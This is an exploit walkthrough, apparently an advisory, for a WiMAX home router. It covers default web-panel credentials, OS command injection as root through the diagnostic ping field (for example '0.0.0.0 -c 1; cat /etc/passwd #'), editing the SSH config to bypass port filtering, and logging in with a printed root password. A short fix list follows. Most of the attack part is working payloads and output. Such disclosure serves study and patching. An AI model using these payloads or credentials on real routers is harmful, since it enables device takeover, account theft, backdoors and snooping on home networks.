==Risks
    1-An attacker could steal WiMAX authentication password which lets him to use vicitim's account for free.
    2-An attacker could setup a persistent backdoor on the router and use it on any time.
    3-An attacker could attack to local devices on the network.
    4-An attacker could listen to sensitive data.
    And lots of other things.

==Objectives
    1-Enter the web admin panel on the router (Usually on 192.168.0.1)
    2-Find somewhere to inject OS Commands
    3-Open an SSH port
    4-Login in to SSH

=Enter the web admin panel on the router (Usually on 192.168.0.1)
  In these routers there is a user called 'system' that has the default password 'system', Unfortunately.
  Also it is common for users to leave the admin user 's password UNCHANGED.
=Find somewhere to inject OS Commands
  Usually routers have somewhere for ping & diagnostics so like others you can arrive to "/cgi-bin/diagnostic.cgi".
  At there you can inject commands which will be executed as root.
  e.g.: In the IP address input write "0.0.0.0 -c 1; cat /etc/passwd #". This would probably show the passwd file.
=Open an SSH port
  As we already have the ability to run commands as root we can do various things, like finding passwords,
  running services and ... . So to open an SSH port we would just step forward to ssh config files, We run "0.0.0.0 -c 1; find / -name *ssh* #".
  That would probably result something like above:
    --- 0.0.0.0 ping statistics ---
    1 packets transmitted, 1 packets received, 0% packet loss
    round-trip min/avg/max = 0.0/0.0/0.0 ms
    /etc/change_ssh_account
    /etc/sncfg/sshd.cfg
    /usr/cfg/sshd.cfg
    /usr/trans/sshd.trans
    Content-type: text/html
    ...
  Lets lookup the files, The first file contains username and password for ssh login, The second and third file contains SSH service's port,
  which in this case it is 22. As you know the SSH port is FILTERED, How? something specifies the port to filter.
  There are acctually ebtables and iptables installed so you can port forward the port 22 to an open port either open the port 22.
  *However there is a more simple way, Just change the port in the file "/etc/sncfg/sshd.cfg" to something else and leave the "/usr/cfg/sshd.cfg" unchanged (And reboot).
=Login in to SSH
  We can easily ssh to router with the credentials found in "/etc/change_ssh_account".
  e.g.: ssh root@192.168.0.1 
          root@192.168.0.1's password: gjsrtf29
        # uname -m
          armv5tejl


==How to fix this?
  -Update the firmware.
  -Disable the web admin panel.
  -Change the SSH password to something safer.
  -Filter useless open ports (There are lots of them.).
  -Disable Remote management.
